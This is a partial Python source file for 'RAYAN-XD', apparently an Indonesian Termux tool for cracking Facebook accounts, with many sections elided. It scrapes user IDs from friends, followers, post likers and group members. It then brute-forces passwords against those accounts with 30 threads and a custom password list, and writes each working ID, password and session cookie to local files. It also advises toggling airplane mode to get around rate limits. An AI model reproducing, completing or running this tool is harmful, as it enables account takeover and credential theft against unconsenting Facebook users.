...
┃╭━╮┃╱┃┃╱╭┫┣┫┃╱╱╱┃╭━╮┃┃╱┃┃┃┃┃┃┃╰━━┳╯╰╯┃
╰╯╱╰╯╱╰╯╱╰━━┻╯╱╱╱╰╯╱╰┻╯╱╰┻╯╰╯╰┻━━━┻━━━╯
• FACEBOOK : MRraRayan-XD 
• https://github.com/Rayan-XD •
• VERSION 4.0 •
• DONATE VIA DANA : 085863483241☺️ •
'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
	cetak(nel(oi, title='[bold cyan] • DEVELOVER INFORMASI • [/bold cyan]'))
# VALIDASI TOKEN
def login():
		try:
...
def login_lagi334():
	try:
		...
		print('%s# COOKIES KADALUWARSA / AKUN TERKENA CP '%(h))
		exit()
...
def menu(my_name,my_id):
	...
	io = '''[bold cyan][01] CRACK DARI TEMAN	     [06] CRACK DARI FILES
[02] CRACK PUBLIK MASSAL   [07] CEK AKUN CHECKPOINT
[03] CRACK FOLLOWERS		     [08] LIHAT HASIL CRACK
[04] CRACK DARI LIKE POSTINGAN	     [09] TIPS CRACK
[05] CRACK DARI GRUP MEMBER           [00] KELUAR[bold cyan]'''
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/RAYAN-DATA/CP')
			...
			back()
		if len(vin)==0:
			haha = '# ANDA TIDAK MEMILIKI HASIL CP'
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/RAYAN-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/RAYAN-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/RAYAN-DATA/OK')
		except FileNotFoundError:
			gada = '# PENYIMPANAN TIDAK DITEMUKAN '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA TIDAK MEMILIKI HASIL OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/RAYAN-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/RAYAN-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
# OPEN
def file():
	tek = '# PERIKSA CHECKPOINT DARI FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] PROSES FILE, HARAP TUNGGU •••')
	time.sleep(2)
	teks = '# PILIH FILE UNTUK DI CEK'
	sol().print(mark(teks, style='cyan'))
	my_files = []
	try:
		lis = os.listdir('/sdcard/RAYAN-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('/sdcard/RAYAN-DATA/OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA TIDAK MEMILIKI HASIL UNTUK DI CEK'
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/RAYAN-DATA/1CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/RAYAN-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] KETIK "me" JIKA ANDA INGIN CRACK DARI TEMAN ANDA')
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		for met in range(jum):
			yz+=1
			kl = masukan(x+'['+h+str(yz)+x+'] ketik '+str(yz)+'me : ')
			uid.append(kl)
	sed='# TUNGGU MENGUMPULKAN ID'
...
def dump_pengikut():
	try:
		...
		exit()
	win = '# CRACK ID DARI FOLLOWERS'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] KETIK "me" JIKA ANDA INGIN CRACK DARI FOLLOWERS ANDA')
	pil = input(x+'['+p+'f'+x+'] MASUKAN : ')
	try:
		...
		teks = '# CRACK GAGAL ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
#DUMP LIKES
def dump_likes():
	try:
		...
		exit()
	win = '# CRACK ID DARI LIKE POSTINGAN'
	win2 = mark(win, style='green')
	sol().print(win2)
...
def dump_grup():
	...
	if titt2=='Masuk Facebook':
		au = '# BATAS ON OFF MODE PESAWAT & COBA LAGI'
		au2 = mark(win, style='red')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	elif titt2=='Kesalahan':
		au = '# GRUP TIDAK DITEMUKAN'
	...
	for xb in xxb:
		...
		try:
			...
			pass
	au = 'NAMA GRUP    : '+titt2+'\n'+'GRUP MEMBER : '+str(totid[0])
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • GRUP TARGET •[/bold cyan]'))
	au = '[•] UNTUK BERHENTI TEKAN CTRL+C\n[•] MAINKAN MODE PESAWAT'
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • SARAN •[/bold cyan]'))
					...
					for c in b:
						if "profile.php" in c[0]:
							...
							if d in id:
								...
								id.append(d+"|"+c[1])
						sys.stdout.write('\r  [•] MENGUMPULKAN %s ID'%(len(id))); sys.stdout.flush()
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/RAYAN-DATA/DUMP')
	except FileNotFoundError:
		gada = '# PENYIMPANAN TIDAK DITEMUKAN '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/RAYAN-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/RAYAN-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	guw = '# TAMPILAN APLIKASI TERKAIT ? (y/t)'
	...
	if cpres in ['y','Y']:
		...
		princp.append('no')
	guw = '# INGIN MENGGUNAKAN PASSWORD TAMBAHAN ? (y/t)'
	sol().print(mark(guw, style='cyan'))
	pwplus=input(x+'['+p+'f'+x+'] Choose : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] GUNAKAN KOMA SEBAGAI PEMISAH\n[•] GUNAKAN HURUF KECIL\n[•] CONTOH: rayan123,rayan1234,rayan12345'
...
# WORDLIST
def passwrd():
	ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK STOP'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# INGIN MENUNJUKKAN PILIHAN CHECKPOINT ? (y/t)'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='RAYAN-XD CP'))
					open('/sdcard/RAYAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/RAYAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='RAYAN-XD OK'))
					ok+=1
					break
					...
					infoakun += (f"\n[bold cyan][•] DAFTAR APLIKASI AKTIF :[/bold cyan] \n")
					...
					hit=0
					infoakun += (f"\n[bold yellow][•] DAFTAR APLIKASI KADALUWARSA :[/bold yellow]\n")
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RAYAN XD OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					hit=0
					infoakun += (f"\n[bold yellow][•] DAFTAR APLIKASI KEDALUWARSA :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/RAYAN-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/RAYAN-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/RAYAN-DATA/DUMP')
	except:pass
	login()